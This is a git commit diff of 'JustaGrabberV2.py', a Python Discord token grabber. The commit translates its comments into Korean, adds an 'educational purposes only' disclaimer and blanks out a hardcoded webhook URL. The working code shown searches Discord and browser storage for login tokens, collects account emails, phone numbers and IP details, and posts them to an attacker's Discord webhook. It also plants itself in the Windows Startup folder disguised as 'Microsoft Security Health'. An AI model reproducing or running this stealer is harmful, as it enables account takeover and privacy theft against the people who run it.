39c646cc1a359ebfe01d71b16f87e55308b1919c
fanta09tv <75021036+fanta09tv@users.noreply.github.com>
2022-03-08 13:50:42 +0900

    Update JustaGrabberV2.py

--- JustaGrabberV2.py
+++ JustaGrabberV2.py
@@ -1,34 +1,35 @@
 """ 
+     **오직 교육적 목적으로 제작된 프로그램입니다. 이용시 모든 책임은 사용자에게 있는걸 인지하고 다운로드 해야합니다**
      ██╗██╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ██╗   ██╗██████╗ 
      ██║██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║╚════██╗
      ██║██║   ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝    ██║   ██║ █████╔╝
 ██   ██║██║   ██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
 ╚█████╔╝╚██████╔╝███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║     ╚████╔╝ ███████╗
  ╚════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝
-    Info : 
-    JustaGrabber V2 is next version of JustaGrabber, maded by kldiscord's new account.
-    This is offical JustaGrabber. Download at : https://github.com/fanta09tv/JustaGrabberV2 
-    Please read readme.md or comment in script for work. 
+    설명 :
+    JustaGrabberV2 는 KYB Software의 프로그램입니다. 무단복제를 금지합니다.
+    꼭 주석을 읽거나 설명을 읽고 하시기 바랍니다
 """
+# requests 모듈이 깔려 있어야합니다. 없으면 엠베드는 보내지 않습니다
 
 import sys
-try:  # IF requests module not exits, will just exit.
+try:  
     import requests
 except ModuleNotFoundError:
     sys.exit()
 
-import os, re, json, urllib.request,datetime,random,shutil # Importing some modules
+import os, re, json, urllib.request,datetime,random,shutil 
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/946592101393657906/BMSDMcb0E9Eg6l7pE3ykRrMGTB-7tsIMyP0AWa-aTrJyJASt-JeXd3ewqY7LTiBCT-fd' # Paste your webhook url in here.
-Ping_me = True # If true, webhook will ping @everyone when grabs token.
-BlacklistedIP = ["1.1.1.1","2.2.2.2"] # If the victim's ip in this list, JustaGrabberV2 will just exit.
+WEBHOOK_URL = '' # 여기에 당신에 웹훅을 붙여 넣으세요
+Ping_me = True # 만약 True이면 웹훅은 토큰을 땄을때 당신을 멘션할겁니다
+BlacklistedIP = ["1.1.1.1","2.2.2.2"] # 만약 실행한 사람의 아이피가 이 리스트 안에 있으면 즉시 종료하고 결과를 보내지 않습니다
 
-# The settings below is for startup. If you Changed startup setting to False, settings below is not required.
-Startup = True # If true, JustaGrabberV2 will start when computer boots, but you have to write filename in line 27.
-FileName = "JustaGrabberV2.py" # Write the JustaGrabberV2 file name, Ex ) JustaGrabber.py, hello.py or if exe : JustaGrabber.exe NotVirus.exe
-extension = ".py" # Change this to the file extension like : .exe , .py , .bat 
+# 아래 설정들은 시작프로그램 세팅입니다. Startup = False일때는 그 아래 세팅들을 안해도 됩니다.
+Startup = True #만약 True이면 컴퓨터를 켤때마다 자동 시작됩니다. FileName, extension을 꼭 확인해주시기 바랍니다.
+FileName = "JustaGrabberV2.py" # 파일 이름을 적어주세요. 파일 이름이 달라지면 안됩니다. JustaGrabber.py나 Grabber.exe등 꼭 해당 파일의 완성본의 이름을 적어주세요
+extension = ".py" # 완성된 파일의 확장명입니다. 예) .py / .exe / .bat 등
 
-def find_tokens(path): # Finding tokens method
+def find_tokens(path): # 토큰찾기 
     path += '\\Local Storage\\leveldb'
     tokens = [] # Token list
 
@@ -43,14 +44,14 @@ def find_tokens(path): # Finding tokens method
                         tokens.append(token)
     return tokens
 
-def JustaGrabber():
+def JustaGrabber(): #메임함수
     appdata = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     temp = os.getenv('TEMP')
     tempfolder = temp + "\\" + str(random.randint(10000000,99999999))
-    os.mkdir(tempfolder) # Making random temp folder to save token info file
+    os.mkdir(tempfolder) # 랜덤한 정크 폴더를 만듭니다.
 
-    paths = { # Browsers, Discord clients path
+    paths = { # 브라우저, 디스코드 클라이언트 폴더
         '<Discord> ': roaming + '\\Discord',
         '<LightCord> ': roaming + '\\Lightcord',
         '<Discord_Canary>' : roaming + '\\discordcanary',
@@ -75,7 +76,7 @@ def JustaGrabber():
         '<Naver_whale_Flash>' : appdata + '\\Naver\\Naver Whale Flash\\User Data\\Default'
     }
 
-    def getipinfo(): # Getting if info.
+    def getipinfo(): # IP의 정보를 따는중
         url = "http://ipinfo.io/json"
         responce = urllib.request.urlopen(url)
         data = json.load(responce)
@@ -93,11 +94,11 @@ def JustaGrabber():
         sys.exit()
 
     if Ping_me:
-        message = "@everyone   JustaGrabberV2 found a new token! \n" # If Ping_me true, Ping @everyone
+        message = "@everyone   JustaGrabberV2 found a new token! \n" # 멘션하기
     message += "```md\n"
  
     file = open(tempfolder+"/Tokeninfo.txt","w+")
-    file.write("Token Info by JustaGrabberV2\n \n") # Writing toke info file.
+    file.write("Token Info by JustaGrabberV2\n \n") # 토큰정보 파일 생성
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
@@ -132,10 +133,10 @@ def JustaGrabber():
                         reee = False
                         if 'premium_type' in r.json():
                             reee = True
-                        # File writer ( below )
+                        # 토큰정보파일 쓰기 ( 아래 )
                         file.write(f"\n--------------------\nToken : {token}\nUsername : {userName}\nUser ID : {userID}\nPhone : {phone}\nEmail : {email}\nVerified : {fff}\n2 Factor login enabled : {mfa}\nNSFW allowed : {f}\nLanguage : {ff}\nFlags : {ffff}\nNitro : {reee}\nAvatar : https://cdn.discordapp.com/avatars/{userID}/{fffff}\n--------------------\n")
 
-        else:  # No usable tokens found in path
+        else: 
             message += '[Error](No tokens found.)\n'
 
     headers = {
@@ -143,9 +144,9 @@ def JustaGrabber():
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
     }
     message += "```"
-    payload = json.dumps({'content': message}) # Sending message
+    payload = json.dumps({'content': message}) # 메세지 보내기
     try: 
-        req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers) # Embeds
+        req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers) # 엠베드
         urllib.request.urlopen(req)
         today = datetime.date.today()
         alert = {
@@ -169,12 +170,12 @@ def JustaGrabber():
             }
         ]
         } 
-        requests.post(WEBHOOK_URL, json=alert)  # Sending Embeds
+        requests.post(WEBHOOK_URL, json=alert)  # 엠베트 보내기
         file.close()
-        requests.post(WEBHOOK_URL, files={'upload_file': open(tempfolder+"/Tokeninfo.txt")}) # Uploading token info file.
+        requests.post(WEBHOOK_URL, files={'upload_file': open(tempfolder+"/Tokeninfo.txt")}) # 토큰정보 파일 올리기
     except:
         pass
-    # Startup ( below )
+    # 시작프로그램 ( 아래 )
     if Startup : shutil.copyfile(f'{FileName}',"C:\\Users\\" + os.getenv('USER', os.getenv('USERNAME', 'user')) + f"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Security Health{extension}")
     
 if __name__ == "__main__":
